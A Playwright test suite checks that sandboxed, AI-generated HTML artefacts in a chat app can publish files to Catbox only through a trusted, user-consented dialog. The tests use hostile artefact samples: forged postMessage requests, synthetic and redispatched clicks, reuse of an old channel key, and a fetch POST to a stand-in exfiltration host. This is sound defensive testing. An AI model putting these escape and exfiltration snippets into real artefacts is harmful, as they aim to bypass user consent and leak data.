import { test, expect } from '@playwright/test';
import { createServer } from '../../server.mjs';

let server, base;
const API = 'https://catbox.moe/user/api.php';
const PUBLIC_URL = 'https://files.catbox.moe/prism-test.txt';
const FILE = { name: 'public-note.txt', mimeType: 'text/plain', buffer: Buffer.from('A deliberately public test file.') };
const PRIVATE_KEY = 'model-api-secret-never-catbox';
const traffic = new WeakMap();
const response = (body = '', status = 200, headers = {}) => ({ status, body, contentType: 'text/plain', headers: { 'access-control-allow-origin': '*', ...headers } });

test.beforeAll(async () => {
  server = createServer();
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  base = `http://127.0.0.1:${server.address().port}`;
});
test.afterAll(async () => {
  server.closeAllConnections();
  await new Promise(resolve => server.close(resolve));
});
test.beforeEach(async ({ page, context }) => {
  // Cover popup first requests and favicon/subresource requests too, not only the app page.
  await context.route('https://**', route => route.abort('blockedbyclient'));
  traffic.set(page, []);
  page.on('request', request => {
    if (request.url().startsWith('https://') && !request.url().startsWith('https://cdn.jsdelivr.net/')) traffic.get(page).push(request);
  });
  // No test can upload, call a model/MCP, or even fetch a candidate public URL on the real network.
  await page.route('https://**', route => route.request().url().startsWith('https://cdn.jsdelivr.net/')
    ? route.fulfill({ contentType: 'text/javascript', body: '' })
    : route.abort('blockedbyclient'));
  await page.addInitScript(api => {
    const nativeFetch = window.fetch.bind(window);
    window.__catboxFetches = [];
    window.fetch = (url, init = {}) => {
      if (String(url) === api) window.__catboxFetches.push({
        url: String(url), method: init.method || 'GET', credentials: init.credentials, redirect: init.redirect,
        referrerPolicy: init.referrerPolicy, mode: init.mode,
        fields: init.body instanceof FormData ? [...init.body.keys()] : [], signal: init.signal,
      });
      return nativeFetch(url, init);
    };
  }, API);
});

async function openExample(page, { html, sibling = false } = {}) {
  await page.goto(base);
  await expect(page.locator('#api-protocol-gemini')).toBeEnabled();
  await page.evaluate(async ({ html, sibling, key }) => {
    const { renderAssistantContent } = await import('./artefacts.js');
    const { getPrismHelp } = await import('./api.js');
    const example = html ?? getPrismHelp({}).example_html;
    window.__uploadExample = example;
    document.querySelector('#api-key').value = key;
    document.querySelector('#welcome').hidden = true;
    for (const id of sibling ? ['upload-under-test', 'other-upload-frame'] : ['upload-under-test']) {
      const container = document.createElement('div');
      container.id = id;
      document.querySelector('#messages').append(container);
      renderAssistantContent(container, example);
    }
  }, { html, sibling, key: PRIVATE_KEY });
  const child = page.frameLocator('#upload-under-test .artefact-frame').frameLocator('iframe');
  await expect(child.locator('#upload')).toBeVisible();
  return child;
}
async function start(page, child, keyboard = false) {
  if (keyboard) await child.locator('#upload').press('Enter');
  else await child.locator('#upload').click();
  await expect(page.locator('#prism-catbox-dialog')).toBeVisible();
}
async function frames(page) {
  await page.evaluate(() => new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve))));
}
async function choose(page) {
  await page.locator('#catbox-file').setInputFiles(FILE);
  await expect(page.locator('#catbox-consent')).not.toBeChecked();
  await page.locator('#catbox-consent').check();
  await expect(page.locator('#catbox-upload')).toBeEnabled();
}
async function state(page) {
  return page.evaluate(async () => (await import('./storage.js')).createStore().load());
}
async function fetches(page) {
  return page.evaluate(() => window.__catboxFetches.map(({ signal, ...entry }) => ({ ...entry, aborted: signal?.aborted })));
}
function assertOnlyCatbox(page, methods) {
  const requests = traffic.get(page);
  expect(requests.map(request => request.url())).toEqual(methods.map(() => API));
  expect(requests.map(request => request.method())).toEqual(methods);
}
function deferred() {
  let resolve;
  const promise = new Promise(done => { resolve = done; });
  return { promise, resolve };
}
const attackHTML = `<artefact title="Untrusted upload attempts"><button id="upload">Real upload</button><button id="wrong">Arguments forbidden</button><button id="later">Delayed request</button><output id="result"></output><script>
const out=document.querySelector('#result');
const request=(...args)=>window.prism.uploadToCatbox(...args).then(url=>out.textContent=url).catch(error=>out.textContent=error.message);
document.querySelector('#upload').onclick=()=>request();
document.querySelector('#wrong').onclick=()=>request('https://files.catbox.moe/forged.txt');
document.querySelector('#later').onclick=()=>setTimeout(()=>request(),0);
window.requestUpload=request;
</script></artefact>`;

for (const viewport of [{ width: 1365, height: 1000, name: 'desktop' }, { width: 390, height: 844, name: 'mobile' }]) {
  test(`actual help example opens trusted public-sharing dialog with keyboard/focus and responsive privacy copy (${viewport.name})`, async ({ page }) => {
    await page.setViewportSize(viewport);
    const child = await openExample(page);
    await expect(child.locator('body')).toContainText('Do not upload private files or secrets');
    await start(page, child, true);
    const dialog = page.locator('#prism-catbox-dialog');
    await expect(dialog).toHaveJSProperty('tagName', 'DIALOG');
    await expect(dialog).toHaveAttribute('open', '');
    await expect(page.locator('#catbox-title')).toBeFocused();
    await expect(dialog).toHaveAttribute('aria-labelledby', 'catbox-title');
    await expect(dialog).toContainText('PUBLIC FILES');
    await expect(dialog).toContainText('EXIF metadata are not stripped');
    await expect(dialog).toContainText('may persist indefinitely');
    await expect(dialog).toContainText('does not send a model message or save the link');
    await expect(page.locator('#catbox-consent')).not.toBeChecked();
    await expect(page.locator('#catbox-upload')).toBeDisabled();
    await expect(page.locator('#catbox-use-link')).toBeDisabled();
    await expect(page.locator('#catbox-official-site')).toHaveAttribute('href', 'https://catbox.moe/');
    await expect(page.locator('#catbox-official-site')).toHaveAttribute('rel', 'noopener noreferrer');
    await expect(page.locator('#catbox-official-site')).toHaveAttribute('referrerpolicy', 'no-referrer');
    await expect(page.locator('#upload-under-test .artefact-frame')).toHaveAttribute('sandbox', 'allow-scripts');
    await expect(page.frameLocator('#upload-under-test .artefact-frame').locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts');
    await expect(child.locator('#prism-catbox-dialog')).toHaveCount(0);
    const bounds = await dialog.evaluate(node => ({ left: node.getBoundingClientRect().left, right: node.getBoundingClientRect().right, width: innerWidth, scroll: node.scrollWidth, client: node.clientWidth }));
    expect(bounds.left).toBeGreaterThanOrEqual(0);
    expect(bounds.right).toBeLessThanOrEqual(bounds.width);
    expect(bounds.scroll).toBeLessThanOrEqual(bounds.client + 1);
    await page.screenshot({ path: `artifacts/prism-catbox-upload-${viewport.name}.png`, fullPage: true, animations: 'disabled' });
    await page.locator('#message-input').evaluate(node => node.focus());
    await expect(page.locator('#catbox-title')).toBeFocused();
    for (let i = 0; i < 12; i++) {
      await page.keyboard.press('Tab');
      const focus = await dialog.evaluate(node => ({ inside: node.contains(document.activeElement), pageFocused: document.hasFocus(), activeTag: document.activeElement.tagName, modal: node.matches(':modal') }));
      expect(focus.modal).toBe(true);
      // Native Chromium dialogs allow browser chrome in the Tab cycle. That is not an escape
      // into the inert app: in-document focus must always remain within the trusted dialog.
      expect(focus.inside || (!focus.pageFocused && focus.activeTag === 'BODY')).toBe(true);
    }
    await page.keyboard.press('Escape');
    await expect(dialog).toHaveCount(0);
    await expect(child.locator('#result')).toContainText('cancelled');
    assertOnlyCatbox(page, []);
  });
}

test('synthetic/no-activation/delayed/wrong-argument and forged window messages cannot open or publish', async ({ page }) => {
  const child = await openExample(page, { html: attackHTML });
  await child.locator('body').evaluate(() => window.requestUpload());
  await expect(child.locator('#result')).not.toHaveText('');
  await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
  await child.locator('#upload').evaluate(button => button.click());
  await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
  await child.locator('#upload').dispatchEvent('click');
  await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
  await child.locator('#wrong').click();
  await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
  await child.locator('#later').click();
  await expect(child.locator('#result')).toContainText('click');
  await frames(page);
  const token = new URL(await page.locator('#upload-under-test .artefact-frame').getAttribute('src')).hash.slice(1);
  await child.locator('body').evaluate((_, token) => {
    const id = crypto.randomUUID();
    top.postMessage({ type: 'prism-artefact-catbox-request', token, id }, '*');
    parent.postMessage({ type: 'prism-artefact-catbox-request', token, id }, '*');
    parent.postMessage({ type: 'catbox-request', token, id }, '*');
    parent.postMessage({ type: 'prism-artefact-catbox-result', token, id, url: 'https://files.catbox.moe/forged.txt' }, '*');
  }, token);
  await frames(page);
  await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
  assertOnlyCatbox(page, []);
  // Rejected attacks do not disable the legitimate, user-controlled path.
  await start(page, child);
  await page.locator('#catbox-cancel').click();
});

test('redispatching the same formerly trusted native MouseEvent cannot reuse its saved click permission', async ({ page }) => {
  const html = `<artefact title="Saved event attack"><button id="upload">Save and redispatch this click</button><output id="result"></output><script>
const button=document.querySelector('#upload'),out=document.querySelector('#result');
button.onclick=event=>{
  if(event.isTrusted){setTimeout(()=>button.dispatchEvent(event),0);return;}
  out.dataset.active=String(navigator.userActivation.isActive);
  out.dataset.trusted=String(event.isTrusted);
  window.prism.uploadToCatbox().then(url=>out.textContent=url).catch(error=>out.textContent=error.message);
};
</script></artefact>`;
  const child = await openExample(page, { html });
  await child.locator('#upload').click();
  await expect(child.locator('#result')).toHaveAttribute('data-active', 'true');
  await expect(child.locator('#result')).toHaveAttribute('data-trusted', 'false');
  await expect(child.locator('#result')).toContainText('click');
  await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
  assertOnlyCatbox(page, []);
});

test('the public helper does not grant arbitrary network, local storage, or file-system access', async ({ page }) => {
  let exfilRequests = 0;
  await page.route('https://upload-exfil.example/**', route => { exfilRequests++; return route.fulfill({ body: 'unexpected', headers: { 'access-control-allow-origin': '*' } }); });
  const child = await openExample(page);
  const isolation = await child.locator('body').evaluate(async () => {
    let network, storage, filePicker;
    try { await fetch('https://upload-exfil.example/private', { method: 'POST', body: 'must-not-leave-the-frame' }); network = 'allowed'; } catch (error) { network = error.name; }
    try { localStorage.getItem('secret'); storage = 'allowed'; } catch (error) { storage = error.name; }
    if (typeof showOpenFilePicker !== 'function') filePicker = 'unavailable';
    else try { await showOpenFilePicker(); filePicker = 'allowed'; } catch (error) { filePicker = error.name; }
    const descriptor = Object.getOwnPropertyDescriptor(window, 'prism');
    return { network, storage, filePicker, keys: Object.keys(window.prism), frozen: Object.isFrozen(window.prism), writable: descriptor.writable, configurable: descriptor.configurable, policy: document.querySelector('meta[http-equiv="Content-Security-Policy"]').content };
  });
  expect(isolation).toMatchObject({ network: 'TypeError', storage: 'SecurityError', keys: ['uploadToCatbox'], frozen: true, writable: false, configurable: false });
  expect(['unavailable', 'SecurityError', 'NotAllowedError']).toContain(isolation.filePicker);
  expect(isolation.policy).toContain("connect-src 'none'");
  expect(isolation.policy).toContain("script-src 'unsafe-inline'");
  expect(isolation.policy).toContain("frame-src 'none'");
  expect(exfilRequests).toBe(0);
  await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
});

test('official website fallback opens a separate mocked tab with no opener or referrer', async ({ page, context }) => {
  const headers = [];
  await context.route('https://catbox.moe/', async route => {
    headers.push(await route.request().allHeaders());
    await route.fulfill({ contentType: 'text/html', body: '<!doctype html><title>Mock Catbox website</title><h1>Mock official website</h1>' });
  });
  const child = await openExample(page);
  await start(page, child);
  const pending = context.waitForEvent('page');
  await page.locator('#catbox-official-site').click();
  const popup = await pending;
  await expect(popup.locator('h1')).toHaveText('Mock official website');
  expect(await popup.evaluate(() => window.opener)).toBeNull();
  expect(await popup.evaluate(() => document.referrer)).toBe('');
  expect(headers).toHaveLength(1);
  expect(headers[0].referer).toBeUndefined();
  await popup.close();
  await expect(page.locator('#prism-catbox-dialog')).toBeVisible();
  await expect(child.locator('#result')).toHaveText('');
  expect(await fetches(page)).toEqual([]);
  await page.locator('#catbox-cancel').click();
});

test('choosing a file never uploads; consent resets on file/manual edits and host synthetic clicks remain inert', async ({ page }) => {
  const child = await openExample(page);
  await start(page, child);
  await page.locator('#catbox-file').setInputFiles(FILE);
  await expect(page.locator('#catbox-upload')).toBeDisabled();
  await page.locator('#catbox-consent').check();
  await page.locator('#catbox-file').setInputFiles({ ...FILE, name: 'another-public-note.txt' });
  await expect(page.locator('#catbox-consent')).not.toBeChecked();
  await expect(page.locator('#catbox-upload')).toBeDisabled();
  await page.locator('#catbox-consent').check();
  await page.locator('#catbox-url').fill(PUBLIC_URL);
  await expect(page.locator('#catbox-consent')).not.toBeChecked();
  await page.locator('#catbox-consent').check();
  await page.locator('#catbox-upload').evaluate(button => button.click());
  await page.locator('#catbox-use-link').evaluate(button => button.click());
  await frames(page);
  await expect(page.locator('#prism-catbox-dialog')).toBeVisible();
  await expect(child.locator('#result')).toHaveText('');
  assertOnlyCatbox(page, []);
  await page.locator('#catbox-cancel').click();
});

test('readable GET gates exactly one anonymous multipart POST and returns only the URL to the requesting frame', async ({ page, context }) => {
  await context.addCookies([{ name: 'private-catbox-cookie', value: 'not-for-upload', domain: 'catbox.moe', path: '/', secure: true }]);
  await page.route(API, route => route.fulfill(response(route.request().method() === 'GET' ? 'Catbox API available' : PUBLIC_URL + '\n')));
  const child = await openExample(page, { sibling: true });
  const before = await state(page);
  await start(page, child);
  await choose(page);
  assertOnlyCatbox(page, []);
  await page.locator('#catbox-upload').click();
  await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
  await expect(child.locator('#result')).toContainText(PUBLIC_URL);
  await expect(child.locator('#result')).toContainText('Paste this link into chat');
  await expect(child.locator('#result')).not.toContainText(FILE.buffer.toString());
  await expect(page.frameLocator('#other-upload-frame .artefact-frame').frameLocator('iframe').locator('#result')).toHaveText('');
  assertOnlyCatbox(page, ['GET', 'POST']);
  const calls = await fetches(page);
  expect(calls.map(({ method, credentials, redirect, referrerPolicy, mode, fields }) => ({ method, credentials, redirect, referrerPolicy, mode, fields }))).toEqual([
    { method: 'GET', credentials: 'omit', redirect: 'error', referrerPolicy: 'no-referrer', mode: 'cors', fields: [] },
    { method: 'POST', credentials: 'omit', redirect: 'error', referrerPolicy: 'no-referrer', mode: 'cors', fields: ['reqtype', 'fileToUpload'] },
  ]);
  const post = traffic.get(page)[1];
  const headers = await post.allHeaders();
  expect(headers.authorization).toBeUndefined();
  expect(headers['x-goog-api-key']).toBeUndefined();
  expect(headers.cookie).toBeUndefined();
  expect(headers.referer).toBeUndefined();
  expect(headers['content-type']).toMatch(/^multipart\/form-data; boundary=/);
  const body = post.postDataBuffer().toString();
  expect([...body.matchAll(/name="([^"]+)"/g)].map(match => match[1]).filter(name => name !== FILE.name)).toEqual(['reqtype', 'fileToUpload']);
  expect(body).toContain('\r\n\r\nfileupload\r\n');
  expect(body).toContain(`filename="${FILE.name}"`);
  expect(body).toContain(FILE.buffer.toString());
  expect(body).not.toContain(PRIVATE_KEY);
  expect(body).not.toContain('userhash');
  expect(await state(page)).toEqual(before);
  await expect(page.locator('#message-input')).toHaveValue('');
  await expect(page.locator('.message.model')).toHaveCount(0);
});

for (const failure of ['cors', 'network', 'http', 'redirect']) {
  test(`unreadable or unsuccessful GET (${failure}) never sends POST and offers a local-only paste fallback`, async ({ page }) => {
    await page.route(API, route => {
      if (failure === 'network') return route.abort('failed');
      if (failure === 'cors') return route.fulfill(response('not readable', 200, { 'access-control-allow-origin': 'https://wrong-origin.test' }));
      if (failure === 'http') return route.fulfill(response('forbidden', 403));
      return route.fulfill(response('', 302, { location: 'https://unexpected-redirect.test/upload' }));
    });
    const child = await openExample(page);
    const before = await state(page);
    await start(page, child);
    await choose(page);
    await page.locator('#catbox-upload').click();
    await expect(page.locator('#catbox-status')).toContainText('No file was sent');
    await expect(page.locator('#catbox-file')).toBeDisabled();
    await expect(page.locator('#catbox-upload')).toBeDisabled();
    await expect(page.locator('#catbox-official-site')).toBeVisible();
    await page.locator('#catbox-url').fill('https://files.catbox.moe/not-allowed.png?private=1');
    await page.locator('#catbox-consent').check();
    await page.locator('#catbox-use-link').click();
    await expect(page.locator('#catbox-status')).toContainText('without credentials');
    await expect(page.locator('#prism-catbox-dialog')).toBeVisible();
    await page.locator('#catbox-url').fill(PUBLIC_URL);
    await expect(page.locator('#catbox-consent')).not.toBeChecked();
    await page.locator('#catbox-consent').check();
    await page.locator('#catbox-use-link').click();
    await expect(child.locator('#result')).toContainText(PUBLIC_URL);
    await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
    assertOnlyCatbox(page, ['GET']);
    expect(await state(page)).toEqual(before);
  });
}

test('manual public URL acceptance requires explicit consent and Use link without any GET, POST, or candidate fetch', async ({ page }) => {
  const child = await openExample(page);
  const before = await state(page);
  await start(page, child);
  await page.locator('#catbox-url').fill(PUBLIC_URL);
  await expect(page.locator('#catbox-use-link')).toBeDisabled();
  await page.locator('#catbox-consent').check();
  await page.locator('#catbox-use-link').click();
  await expect(child.locator('#result')).toContainText(PUBLIC_URL);
  assertOnlyCatbox(page, []);
  expect(await state(page)).toEqual(before);
});

for (const invalid of [
  { name: 'wrong host', body: 'https://evil.example/public.txt' },
  { name: 'query parameters', body: PUBLIC_URL + '?token=private' },
  { name: 'oversized response', body: 'x'.repeat(2049) },
  { name: 'invalid UTF-8', body: Buffer.from([0xff, 0xfe]) },
  { name: 'HTTP failure', body: 'upload failed', status: 503 },
]) {
  test(`post-upload ${invalid.name} is uncertain and cannot trigger an automatic or manual retry`, async ({ page }) => {
    await page.route(API, route => route.fulfill(route.request().method() === 'GET' ? response('readable') : response(invalid.body, invalid.status || 200)));
    const child = await openExample(page);
    await start(page, child);
    await choose(page);
    await page.locator('#catbox-upload').click();
    await expect(page.locator('#catbox-uncertainty')).toBeVisible();
    await expect(page.locator('#catbox-uncertainty')).toContainText('may already have published');
    await expect(page.locator('#catbox-uncertainty')).toContainText('will not retry');
    await expect(page.locator('#catbox-upload')).toBeDisabled();
    await expect(page.locator('#catbox-file')).toBeDisabled();
    await expect(page.locator('#catbox-cancel')).toHaveText('Close');
    await page.locator('#catbox-consent').uncheck();
    await page.locator('#catbox-consent').check();
    await page.locator('#catbox-upload').evaluate(button => button.click());
    await frames(page);
    assertOnlyCatbox(page, ['GET', 'POST']);
    await expect(child.locator('#result')).toHaveText('');
    await page.locator('#catbox-cancel').click();
    await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
    await expect(child.locator('#result')).toContainText('may already have published');
    await expect(child.locator('#result')).not.toContainText(PUBLIC_URL);
  });
}

test('cancelling during a gated GET sends no file and closes without an uncertainty claim', async ({ page }) => {
  const held = deferred();
  await page.route(API, async route => { await held.promise; await route.fulfill(response('readable')).catch(() => {}); });
  try {
    const child = await openExample(page);
    await start(page, child);
    await choose(page);
    await page.locator('#catbox-upload').click();
    await expect.poll(() => traffic.get(page).length).toBe(1);
    await page.keyboard.press('Escape');
    await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
    await expect(child.locator('#result')).toContainText('No file was sent');
    held.resolve();
    await frames(page);
    assertOnlyCatbox(page, ['GET']);
  } finally { held.resolve(); }
});

test('Escape during a POST first preserves the publication warning, then explicit acknowledgement closes with no late URL', async ({ page }) => {
  const held = deferred();
  await page.route(API, async route => {
    if (route.request().method() === 'GET') return route.fulfill(response('readable'));
    await held.promise;
    await route.fulfill(response(PUBLIC_URL)).catch(() => {});
  });
  try {
    const child = await openExample(page);
    await start(page, child);
    await choose(page);
    await page.locator('#catbox-upload').click();
    await expect.poll(() => traffic.get(page).filter(request => request.method() === 'POST').length).toBe(1);
    await page.keyboard.press('Escape');
    await expect(page.locator('#prism-catbox-dialog')).toBeVisible();
    await expect(page.locator('#catbox-uncertainty')).toBeVisible();
    await expect(page.locator('#catbox-upload')).toBeDisabled();
    await expect.poll(async () => (await fetches(page))[1].aborted).toBe(true);
    await page.keyboard.press('Escape');
    await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
    held.resolve();
    await frames(page);
    await expect(child.locator('#result')).toContainText('may already have published');
    await expect(child.locator('#result')).not.toContainText(PUBLIC_URL);
    assertOnlyCatbox(page, ['GET', 'POST']);
  } finally { held.resolve(); }
});

test('immediate same-click inner navigation cannot leave a queued upload prompt behind', async ({ page }) => {
  const html = `<artefact title="Immediate navigation"><button id="upload">Request then immediately navigate</button><script>
document.querySelector('#upload').onclick=()=>{window.prism.uploadToCatbox().catch(()=>{});location.href='about:blank';};
</script></artefact>`;
  const child = await openExample(page, { html });
  const outer = await (await page.locator('#upload-under-test .artefact-frame').elementHandle()).contentFrame();
  const inner = await (await outer.locator('iframe').elementHandle()).contentFrame();
  await child.locator('#upload').click();
  await inner.waitForURL('about:blank');
  await frames(page);
  await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
  assertOnlyCatbox(page, []);
});

for (const stage of ['before upload', 'during POST']) {
  test(`inner about:blank navigation ${stage} revokes its dialog, delivery, and future channel registration`, async ({ page }) => {
    const held = deferred();
    await page.route(API, async route => {
      if (route.request().method() === 'GET') return route.fulfill(response('readable'));
      await held.promise;
      await route.fulfill(response(PUBLIC_URL)).catch(() => {});
    });
    try {
      const child = await openExample(page, { sibling: true });
      const outer = await (await page.locator('#upload-under-test .artefact-frame').elementHandle()).contentFrame();
      const inner = await (await outer.locator('iframe').elementHandle()).contentFrame();
      // Generated code can read its bootstrap key. That must never authorize a new port after navigation.
      const oldKey = await inner.evaluate(() => document.scripts[0].textContent.match(/[a-f0-9]{8}-(?:[a-f0-9]{4}-){3}[a-f0-9]{12}/i)?.[0]);
      expect(oldKey).toMatch(/^[a-f0-9-]{36}$/i);
      const before = await state(page);
      await start(page, child);
      if (stage === 'during POST') {
        await choose(page);
        await page.locator('#catbox-upload').click();
        await expect.poll(() => traffic.get(page).filter(request => request.method() === 'POST').length).toBe(1);
      }
      const navigated = inner.waitForURL('about:blank');
      await inner.evaluate(() => { location.href = 'about:blank'; });
      await navigated;
      if (stage === 'during POST') {
        await expect(page.locator('#prism-catbox-dialog')).toBeVisible();
        await expect(page.locator('#catbox-uncertainty')).toBeVisible();
        await expect(page.locator('#catbox-use-link')).toBeDisabled();
        await expect.poll(async () => (await fetches(page))[1].aborted).toBe(true);
        held.resolve();
        await frames(page);
        await expect(page.locator('#prism-catbox-dialog')).toBeVisible();
        await page.locator('#catbox-cancel').click();
      }
      await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
      await inner.evaluate(key => {
        const channel = new MessageChannel();
        parent.postMessage({ type: 'prism-artefact-link-channel', key }, '*', [channel.port2]);
        const button = document.createElement('button');
        button.id = 'forged-rebind';
        button.textContent = 'Try reusing the old channel key';
        button.onclick = () => channel.port1.postMessage({ type: 'catbox-request', id: crypto.randomUUID() });
        document.body.append(button);
      }, oldKey);
      await frames(page);
      await inner.locator('#forged-rebind').click();
      await frames(page);
      await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
      await expect(page.frameLocator('#other-upload-frame .artefact-frame').frameLocator('iframe').locator('#result')).toHaveText('');
      assertOnlyCatbox(page, stage === 'during POST' ? ['GET', 'POST'] : []);
      expect(await state(page)).toEqual(before);
    } finally { held.resolve(); }
  });
}

for (const lifecycle of ['off', 'removed']) {
  for (const stage of ['before upload', 'during POST']) {
    test(`requesting frame ${lifecycle} ${stage} revokes delivery and ${stage === 'during POST' ? 'keeps a warning until acknowledged' : 'sends no file'}`, async ({ page }) => {
      const held = deferred();
      await page.route(API, async route => {
        if (route.request().method() === 'GET') return route.fulfill(response('readable'));
        await held.promise;
        await route.fulfill(response(PUBLIC_URL)).catch(() => {});
      });
      try {
        const child = await openExample(page, { sibling: true });
        const before = await state(page);
        await start(page, child);
        if (stage === 'during POST') {
          await choose(page);
          await page.locator('#catbox-upload').click();
          await expect.poll(() => traffic.get(page).filter(request => request.method() === 'POST').length).toBe(1);
        }
        await page.evaluate(async lifecycle => {
          const container = document.querySelector('#upload-under-test');
          if (lifecycle === 'removed') container.remove();
          else (await import('./artefacts.js')).renderAssistantContent(container, window.__uploadExample, { enabled: false });
        }, lifecycle);
        await expect(page.locator('#upload-under-test .artefact-frame')).toHaveCount(0);
        if (stage === 'during POST') {
          await expect(page.locator('#catbox-uncertainty')).toBeVisible();
          await expect(page.locator('#catbox-status')).toContainText('closed or disabled');
          await expect(page.locator('#catbox-use-link')).toBeDisabled();
          await expect(page.locator('#catbox-upload')).toBeDisabled();
          await expect.poll(async () => (await fetches(page))[1].aborted).toBe(true);
          held.resolve();
          await frames(page);
          await expect(page.locator('#prism-catbox-dialog')).toBeVisible();
          await page.locator('#catbox-cancel').click();
          assertOnlyCatbox(page, ['GET', 'POST']);
        } else assertOnlyCatbox(page, []);
        await expect(page.locator('#prism-catbox-dialog')).toHaveCount(0);
        await expect(page.frameLocator('#other-upload-frame .artefact-frame').frameLocator('iframe').locator('#result')).toHaveText('');
        expect(await state(page)).toEqual(before);
      } finally { held.resolve(); }
    });
  }
}
